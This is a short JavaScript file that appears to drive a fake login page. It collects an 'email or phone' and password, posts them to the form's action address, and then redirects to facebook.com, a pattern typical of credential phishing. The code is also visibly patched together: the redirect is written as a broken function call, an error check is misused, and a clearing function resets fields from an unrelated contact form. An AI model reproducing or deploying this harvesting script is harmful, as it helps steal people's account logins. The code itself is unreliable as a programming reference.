// input Field
const form = document.querySelector("form");
const email = document.getElementById("email");
const password = document.getElementById("pass");


//Validation
function Validation(){
    if(email.value == ""){
        alert("Please Enter email or phone")
        return false;
    }else if(password.value == ""){
        alert("Please Enter Your Password")
        return false;
    }else{
        return true
    }
}
form.addEventListener("submit", (event) => {
    event.preventDefault();
    if (Validation()) {
        var data = new FormData(event.target);
        fetch(event.target.action, {
          method: form.method,
          body: data,
          headers: {
            'Accept': 'application/json'
          }
        }).then(response => {
          if (response.ok) {
           window.location.href("www.facebook.com")
            form.reset();
          } else {
            response.json().then(data => {
              if (Object.hasOwnProperty(data, 'errors')) {
                showErrorMsg(data["errors"].map(error => error["message"]).join(", "))
              } else {
                alert("Failed to login")

              }
            })
          }
        }).catch(error => {
            alert("Failed to login")
        });
    }
});

function clearFields() {
    document.getElementById('name').value = ''
    document.getElementById("subject").value = ''
    document.getElementById("message").value = ''
    document.getElementById('email').value = ''
    document.getElementById('phone').value = ''
}